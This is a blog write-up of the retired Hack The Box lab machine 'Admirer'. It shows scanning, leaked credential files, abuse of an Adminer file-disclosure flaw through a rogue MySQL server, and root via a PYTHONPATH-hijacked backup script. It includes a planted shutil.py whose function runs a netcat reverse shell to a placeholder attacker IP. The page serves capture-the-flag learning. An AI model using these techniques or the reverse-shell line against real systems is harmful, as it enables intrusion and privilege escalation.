@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>HTB Write-up | Admirer</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=a7e4dafcdc" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="https://inesmartins.github.io//htb-write-up-admirer/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="https://inesmartins.github.io//htb-write-up-admirer/amp/" />
+    
+    <meta property="og:site_name" content="Inês Martins" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up | Admirer" />
+    <meta property="og:description" content="Retired machine can be found here. ScanningAs always, we start with some basic scanning, with tells us that the machine has: an FTP service (vsftp) running on port 21;an OpenSSH service running on port 22;an Apache web server running on port 80:~ nmap -sV -sC -A admirer.htb" />
+    <meta property="og:url" content="https://inesmartins.github.io//htb-write-up-admirer/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/10/admirer.png" />
+    <meta property="article:published_time" content="2020-10-22T09:07:19.000Z" />
+    <meta property="article:modified_time" content="2020-10-22T09:07:19.000Z" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="ftp" />
+    <meta property="article:tag" content="adminer" />
+    <meta property="article:tag" content="mysql" />
+    <meta property="article:tag" content="privesc" />
+    <meta property="article:tag" content="python" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up | Admirer" />
+    <meta name="twitter:description" content="Retired machine can be found here. ScanningAs always, we start with some basic scanning, with tells us that the machine has: an FTP service (vsftp) running on port 21;an OpenSSH service running on port 22;an Apache web server running on port 80:~ nmap -sV -sC -A admirer.htb" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//htb-write-up-admirer/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/10/admirer.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="htb, ftp, adminer, mysql, privesc, python" />
+    <meta name="twitter:site" content="@inesmartns" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="380" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Inês Martins",
+        "url": "https://inesmartins.github.io//",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//content/images/2020/07/0PFUtbOg_400x400.jpg",
+            "width": 400,
+            "height": 400
+        },
+        "url": "https://inesmartins.github.io//author/ines/",
+        "sameAs": []
+    },
+    "headline": "HTB Write-up | Admirer",
+    "url": "https://inesmartins.github.io//htb-write-up-admirer/",
+    "datePublished": "2020-10-22T09:07:19.000Z",
+    "dateModified": "2020-10-22T09:07:19.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://inesmartins.github.io//content/images/2020/10/admirer.png",
+        "width": 598,
+        "height": 380
+    },
+    "keywords": "htb, ftp, adminer, mysql, privesc, python",
+    "description": "Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/248].\n\nScanning\nAs always, we start with some basic scanning, with tells us that the machine\nhas:\n\n * an FTP service (vsftp) running on port 21;\n * an OpenSSH service running on port 22;\n * an Apache web server running on port 80:\n\n~ nmap -sV -sC -A admirer.htb\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 15:37 WEST\nNmap scan report for admirer.htb (10.10.10.187)\nHost is up (0.043s latency).\nNot shown: 9",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://inesmartins.github.io//"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.18" />
+    <link rel="alternate" type="application/rss+xml" title="Inês Martins" href="https://inesmartins.github.io//rss/" />
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180659126-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180659126-1');
+</script>
+
+</head>
+<body class="post-template tag-htb tag-ftp tag-adminer tag-mysql tag-privesc tag-python">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="https://inesmartins.github.io/">Inês Martins</a>
+            <div class="site-nav-content">
+                    <ul class="nav">
+    <li class="nav-home"><a href="https://inesmartins.github.io//">Home</a></li>
+</ul>
+
+                    <span class="nav-post-title dash">HTB Write-up | Admirer</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+                    <a class="social-link social-link-tw" href="https://twitter.com/inesmartns" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://inesmartins.github.io//rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div></header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-htb tag-ftp tag-adminer tag-mysql tag-privesc tag-python ">
+
+            <header class="post-full-header">
+
+                <section class="post-full-tags">
+                    <a href="/tag/htb/">htb</a>
+                </section>
+
+                <h1 class="post-full-title">HTB Write-up | Admirer</h1>
+
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                                    <div class="author-info">
+                                        <h2>Inês Martins</h2>
+                                        <p>Read <a href="/author/ines/">more posts</a> by this author.</p>
+                                    </div>
+                                </div>
+
+                                <a href="/author/ines/" class="author-avatar">
+                                    <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="/author/ines/">Inês Martins</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-10-22">22 Oct 2020</time>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+            <figure class="post-full-image">
+                <img
+                    srcset="/content/images/size/w300/2020/10/admirer.png 300w,
+                            /content/images/size/w600/2020/10/admirer.png 600w,
+                            /content/images/size/w1000/2020/10/admirer.png 1000w,
+                            /content/images/size/w2000/2020/10/admirer.png 2000w"
+                    sizes="(max-width: 800px) 400px,
+                        (max-width: 1170px) 1170px,
+                            2000px"
+                    src="/content/images/size/w2000/2020/10/admirer.png"
+                    alt="HTB Write-up | Admirer"
+                />
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/248">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning, with tells us that the machine has:</p><ul><li>an <code>FTP</code> service (vsftp) running on port 21;</li><li>an <code>OpenSSH</code> service running on port 22;</li><li>an <code>Apache</code> web server running on port 80:</li></ul><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A admirer.htb
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 15:37 WEST
+Nmap scan report for admirer.htb (10.10.10.187)
+Host is up (0.043s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<!--kg-card-end: markdown--><p>The web application is just a very simple image gallery, there's no authentication or anything that immediately stands out, so we start by exploring the disallowed entry (<code>/admin-dir</code>) found during the basic scan.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main.png" class="kg-image"></figure><p>We can't directly access the admin-dir directory but the <a href="http://admirer.htb/robots.txt">robots.txt</a> file has a little clue left to us by "waldo":</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+</code></pre>
+<!--kg-card-end: markdown--><p>With this small clue, we find 2 files:</p><ul><li><a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a></li></ul><!--kg-card-begin: markdown--><pre><code>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre>
+<!--kg-card-end: markdown--><ul><li><a href="http://admirer.htb/admin-dir/contacts.txt">http://admirer.htb/admin-dir/contacts.txt</a>:</li></ul><!--kg-card-begin: markdown--><pre><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+# Amy
+Email: a.bialik@admirer.htb
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre>
+<!--kg-card-end: markdown--><p>Let's do a quick roundup of what we have so far:</p><ol><li>A list of users (with first name and email) that all seem to match the names of Big Bang Theory's characters (except Sheldon Cooper who is instead Waldo Cooper);</li><li>Credentials to one email account (w.cooper@admirer.htb);</li><li>Credentials to one FTP account (ftpuser);</li><li>Credentials to one Wordpress account (admin).</li></ol><p>Since we don't yet know of a way to access the email server or the Wordpress account, we try to explore the FTP service:</p><!--kg-card-begin: markdown--><pre><code>$ ftp 10.10.10.187
+
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:kali): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp&gt; pass
+Passive mode on.
+
+ftp&gt; ls
+227 Entering Passive Mode (10,10,10,187,175,74)
+150 Here comes the directory listing.
+-rw-r--r-- 1 0 0 3405 Dec 02 21:24 dump.sql
+-rw-r--r-- 1 0 0 5270987 Dec 03 21:20 html.tar.gz
+226 Directory send OK.
+
+</code></pre>
+<!--kg-card-end: markdown--><ol><li>The <code>dump.sql</code> file contains a dump of a MariaDB database called <strong>admirerdb</strong>. This DB contains only one table - Items - which includes the images and respective metadata that appear on the site, so nothing too exciting;</li><li>The <code>html.tar.gz</code> includes a bunch of files that look like a backup of the current web application. Here are some of the most noteworthy:</li></ol><h3 id="robots-txt">robots.txt</h3><p>The backup version of the robots.txt file disallows <code>/w4ld0s_s3cr3t_d1r</code> instead of <code>/admin-dir</code>.</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
+This folder contains personal stuff, so no one (not even robots!) should see it - waldo
+Disallow: /w4ld0s_s3cr3t_d1r
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="index-php">index.php</h3><p>Contains the code for the main page of the web application, including some credentials for the admirerdb.</p><!--kg-card-begin: markdown--><pre><code>...
+&lt;div id=&quot;main&quot;&gt;
+&lt;?php
+    $servername = &quot;localhost&quot;;
+    $username = &quot;waldo&quot;;
+    $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
+    $dbname = &quot;admirerdb&quot;;
+
+    // Create connection
+    $conn = new mysqli($servername, $username, $password, $dbname);
+    
+    // Check connection
+    if ($conn-&gt;connect_error) {
+        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
+    }
+
+    $sql = &quot;SELECT * FROM items&quot;;
+    $result = $conn-&gt;query($sql);
+
+    if ($result-&gt;num_rows &gt; 0) {
+        // output data of each row
+        while($row = $result-&gt;fetch_assoc()) {
+            echo &quot;&lt;article class='thumb'&gt;&quot;;
+            echo &quot;&lt;a href='&quot;.$row[&quot;image_path&quot;].&quot;' class='image'&gt;&lt;img src='&quot;.$row[&quot;thumb_path&quot;].&quot;' alt='' /&gt;&lt;/a&gt;&quot;;
+            echo &quot;&lt;h2&gt;&quot;.$row[&quot;title&quot;].&quot;&lt;/h2&gt;&quot;;
+	    	echo &quot;&lt;p&gt;&quot;.$row[&quot;text&quot;].&quot;&lt;/p&gt;&quot;;
+	    	echo &quot;&lt;/article&gt;&quot;;
+        }
+    } else {
+        echo &quot;0 results&quot;;
+    }
+    $conn-&gt;close();
+?&gt;
+&lt;/div&gt;
+...
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="w4ld0s_s3cr3t_d1r-credentials-txt">w4ld0s_s3cr3t_d1r/credentials.txt</h3><p>There's a credentials.txt file which contains the same credentials as found on <a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a> and one additional cred:</p><!--kg-card-begin: markdown--><pre><code>[Bank Account]
+waldo.11
+Ezy]m27}OREc$
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="utility_scripts-db_admin-php">utility_scripts/db_admin.php</h3><p>There's a small script that handles the connection with the database, which contains some credentials:</p><!--kg-card-begin: markdown--><pre><code>&lt;?php
+    $servername = &quot;localhost&quot;;
+    $username = &quot;waldo&quot;;
+    $password = &quot;Wh3r3_1s_w4ld0?&quot;;
+    
+    // Create connection
+    $conn = new mysqli($servername, $username, $password);
+    
+    // Check connection
+    if ($conn-&gt;connect_error) {
+        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
+    }
+    echo &quot;Connected successfully&quot;;
+    
+    // TODO: Finish implementing this or find a better open source alternative
+?&gt;
+
+</code></pre>
+<!--kg-card-end: markdown--><p>So, now we have 2 new credentials:</p><ul><li>one for a bank account (waldo.11);</li><li>one for a mySQL database (waldo);</li></ul><p>Going back to the deployed version of the web application, the <a href="http://admirer.htb/w4ld0s_s3cr3t_d1r/contacts.txt">w4ld0s_s3cr3t_d1r</a> doesn't seem to be available anymore, but the <a href="http://10.10.10.187/utility-scripts/">utility_scripts</a> dir does exist.</p><p>Of all the files on the backup, the <a href="http://10.10.10.187/utility-scripts/admin_tasks.php">admin-tasks page</a> is the most interesting. This page allows any user to check very simple info about the system:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2020/06/4.png" class="kg-image"></figure><p>At this point I was a bit stuck but after reviewing all the previous clues I realised I missed something on the db_admin.php file:</p><pre><code>// TODO: Finish implementing this or find a better open source alternative
+</code></pre><p>After some googling, I realised that the "better open source alternative" to database administration is likely the <a href="https://www.adminer.org/">Adminer</a> tool - the name likeness was a dead giveaway. </p><p>And this brings us to the <a href="http://10.10.10.187/utility-scripts/adminer.php">adminer.php</a> page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login.png" class="kg-image"></figure><h2 id="exploiting-adminer">Exploiting Adminer</h2><p>After trying (and failing) to login with all of the credentials previously found, I decided to search for Adminer vulnerabilities. </p><p>Turns out <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability ">Adminer 4.6.2 is vulnerable to a file disclosure vulnerability</a>.</p><p>So I installed and launched an instance of mySQL server on my machine - I chose to do it on macOS since it looked simpler (read <a href="https://www.dev2qa.com/how-to-use-mysql-on-mac/">this</a> for more info):</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/mysql.png" class="kg-image"></figure><p>And then added a new local user that can access my local mySQL server from the admirer.htb host using the password 'password':</p><!--kg-card-begin: markdown--><pre><code>~ /usr/local/mysql/bin/mysql -u root -p
+Enter password:
+...
+
+mysql&gt; create user 'waldo'@'10.10.10.187' IDENTIFIED WITH mysql_native_password  BY 'password';
+Query OK, 0 rows affected (0.01 sec)
+
+mysql&gt; select user, host from mysql.user;
++------------------+--------------+
+| user             | host         |
++------------------+--------------+
+| waldo            | 10.10.10.187 |
+| mysql.infoschema | localhost    |
+| mysql.session    | localhost    |
+| mysql.sys        | localhost    |
+| root             | localhost    |
++------------------+--------------+
+5 rows in set (0.00 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>In order to get this to work I had to add some additional configuration to my server ('/etc/my.cnf'):</p><!--kg-card-begin: markdown--><pre><code>[mysqld]
+default_authentication_plugin  =  mysql_native_password
+local-infile                   = 1
+</code></pre>
+<!--kg-card-end: markdown--><p>Note that the <a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_local_infile">local-infile</a> variable should be set to true as to allow us to load data from local files into the DB, which we'll need in a following step.</p><p>Once this is done, we can login as our new user from the Adminer client with password 'password'. Note that the server IP should correspond to the IP where you setup the MySQL server and that you need to specify the port if it's not the default (3306).</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-4.png" class="kg-image"></figure><p>After logging into the system, we can access the SQL interface and can send commands directly to the machine. </p><p><strong>Our goal is to load local files from the admirer.htb machine to a new DB in our local mySQL server. </strong></p><p>So, first things first, we need to create a valid db with a table that will receive the data. Note that this table should have a field that should support big lines of text content.</p><!--kg-card-begin: markdown--><pre><code>mysql&gt; create database test;
+
+mysql&gt; use test;
+Database changed
+
+mysql&gt; create table tt (line varchar(1000));
+Query OK, 0 rows affected (0.01 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>Also, you need to grant permission for your user to be able to access that data: </p><!--kg-card-begin: markdown--><pre><code>mysql&gt; grant all privileges on test.tt to 'waldo'@'10.10.10.187';
+Query OK, 0 rows affected (0.04 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>Going back to our SQL interface, the files most likely to contain valid credentials are index.php and db_admin.php, where we previously found outdated DB credentials.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/query.png" class="kg-image"></figure><p>To see the results we can either access the data directly on the SQL interface or go to our mySQL server and query the data.</p><!--kg-card-begin: markdown--><pre><code>~ select line from test.tt;
+
+...
+$servername = &quot;localhost&quot;;
+$username = &quot;waldo&quot;;
+$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;
+$dbname = &quot;admirerdb&quot;;
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>Finally, we have credentials for the admirerdb database and as it turns out waldo's SSH credentials:</p><!--kg-card-begin: markdown--><pre><code>ssh waldo@10.10.10.187
+waldo@10.10.10.187's password:
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jun  8 21:25:38 2020 from 10.10.14.95
+waldo@admirer:~$ 
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="useful-resources">Useful Resources</h3><ul><li><a href="https://www.dev2qa.com/how-to-use-mysql-on-mac/">https://www.dev2qa.com/how-to-use-mysql-on-mac/</a></li><li><a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></li><li><a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html</a></li><li><a href="https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql">https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql</a></li></ul><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>Now authenticated as waldo, we started by running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>, which helped us find some interesting stuff:</p><!--kg-card-begin: markdown--><pre><code>[+] Readable files belonging to root and readable by me but not world readable
+-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
+</code></pre>
+<!--kg-card-end: markdown--><p>On the <code>/opt/scripts/</code> directory we find the <code>admin_tasks</code> bash script which is called by the administrative interface we previously saw. </p><p>At first glance there wasn't any obvious way to exploit this script but, as you can see below, there is a "Backup web data" option which executes the <code>backup.py</code> script as root.</p><!--kg-card-begin: markdown--><pre><code>...
+backup_web()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+        echo &quot;Running backup script in the background, it might take a while...&quot;
+        /opt/scripts/backup.py &amp;
+    else
+        echo &quot;Insufficient privileges to perform the selected operation.&quot;
+    fi
+}
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>The <code>backup.py</code> file, on the other hand, imports the <code>make_archive</code> binary from <code>shutil</code>, which we might be able to exploit by changing the path in which the Python script is executed.</p><!--kg-card-begin: markdown--><pre><code>!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+old ftp directory, not used anymore
+dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+</code></pre>
+<!--kg-card-end: markdown--><p>So, we need to:</p><ul><li>change the <strong>Python path</strong> to start with a directory that we control, e.g.: /home/waldo/.abc/;</li><li>create a <strong>shutil.py</strong> file inside /home/waldo/.abc/;</li><li>add a <strong>make_archive</strong> function to shutil.py that uses the same signature (3 fields) but instead of archiving the web content returns a shell as root;</li></ul><p>Let's start with our mock shutil.py:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ nano /home/waldo/.abc/shutil.py
+
+import os
+
+def make_archive(a, b, c):
+    os.system(&quot;nc [attacker_ip] [attacker_port] -e '/bin/sh'&quot;)
+    
+waldo@admirer:~$ chmod +x /home/waldo/.abc/shutil.py
+</code></pre>
+<!--kg-card-end: markdown--><p>Don't forget to create a listener on the port you specify above:</p><!--kg-card-begin: markdown--><p><code>nc -l [PORT]</code></p>
+<!--kg-card-end: markdown--><p>Now, all we need to do is change the python path on the call for the admin_tasks script:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ sudo PYTHONPATH=/home/waldo/.abc/ /opt/scripts/admin_tasks.sh
+
+[sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+</code></pre>
+<!--kg-card-end: markdown--><p>And we receive a shell as root which allows us to print the root flag!</p><p>Hope you enjoyed it :)</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><br></p>
+                </div>
+            </section>
+
+
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card">
+                    <header class="read-next-card-header">
+                        <h3><span>More in</span> <a href="/tag/htb/">htb</a></h3>
+                    </header>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li>
+                                <h4><a href="/htb-crypto-challenge/">HTB Crypto Challenge | Bank Heist</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-10-22">22 Oct 2020</time> –
+                                        1 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/htb-write-up-cache/">HTB Write-up | Cache</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-10-22">22 Oct 2020</time> –
+                                        9 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/htb-write-up-blunder/">HTB Write-up  | Blunder</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-10-22">22 Oct 2020</time> –
+                                        5 min read</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="/tag/htb/">See all 5 posts
+                            →</a>
+                    </footer>
+                </article>
+
+                <article class="post-card post tag-crypto tag-htb tag-multitap-phone-cipher tag-challenge tag-ctf tag-phone-keypad tag-atbash tag-cryptography ">
+
+    <a class="post-card-image-link" href="/htb-crypto-challenge/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2020/10/heist-movies-on-netflix-866x487.jpg 300w,
+                    /content/images/size/w600/2020/10/heist-movies-on-netflix-866x487.jpg 600w,
+                    /content/images/size/w1000/2020/10/heist-movies-on-netflix-866x487.jpg 1000w,
+                    /content/images/size/w2000/2020/10/heist-movies-on-netflix-866x487.jpg 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="/content/images/size/w600/2020/10/heist-movies-on-netflix-866x487.jpg"
+            alt="HTB Crypto Challenge | Bank Heist"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/htb-crypto-challenge/">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">crypto</div>
+                <h2 class="post-card-title">HTB Crypto Challenge | Bank Heist</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Hint: You get to the scene of a bank heist and find that you have caught one person. Under further analysis of the persons flip phone you see a message</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Inês Martins
+                    </div>
+            
+                    <a href="/author/ines/" class="static-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/ines/">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-10-22">22 Oct 2020</time> <span class="bull">&bull;</span> 1 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+                <article class="post-card post tag-htb tag-linux tag-cache tag-memcached tag-privesc tag-docker tag-openemr ">
+
+    <a class="post-card-image-link" href="/htb-write-up-cache/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2020/10/cache.png 300w,
+                    /content/images/size/w600/2020/10/cache.png 600w,
+                    /content/images/size/w1000/2020/10/cache.png 1000w,
+                    /content/images/size/w2000/2020/10/cache.png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="/content/images/size/w600/2020/10/cache.png"
+            alt="HTB Write-up | Cache"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/htb-write-up-cache/">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">htb</div>
+                <h2 class="post-card-title">HTB Write-up | Cache</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Retired machine can be found here. ScanningWe start with our usual scanning which finds only an instance of OpenSSH running on port 22 and an Apache server running on port</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Inês Martins
+                    </div>
+            
+                    <a href="/author/ines/" class="static-avatar">
